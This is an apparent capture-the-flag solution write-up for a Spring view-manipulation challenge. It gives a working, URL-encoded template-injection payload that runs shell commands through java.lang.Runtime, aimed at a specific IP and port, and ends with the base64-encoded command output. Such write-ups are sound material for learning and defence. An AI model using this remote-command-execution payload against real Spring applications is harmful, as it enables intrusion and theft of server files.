# solution
- https://github.com/veracode-research/spring-view-manipulation
- manipulate the season parameter
- inject a command using *Runtime*
- only the first word will be shown on the screen, so the flag must e.g. be base64 encoded (with wrapping disabled, to avoid linebreaks):

  `cat flag.txt|base64 -w 0`

- in order to allow piped commands, pass an array to Runtime:

  `getRuntime().exec(new String[]{"/bin/sh", "-c", "cat flag.txt|base64 -w 0"})`

- URL encode
- final request:

  `http://46.101.107.117:2111/season?season=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(new%20String%5B%5D%20%7B%22%2Fbin%2Fsh%22%2C%20%22-c%22%2C%20%22cat%20flag.txt%7Cbase64%20%2Dw%200%22%7D).getInputStream()).next()%7d__::.x`

  bm90aGluZyBlbHNlIGJ1dCB0aGUgZmxhZyBoZXJlOiBoZTIwMjF7U3ByMW5nXzFzX215X2Y0dnJ0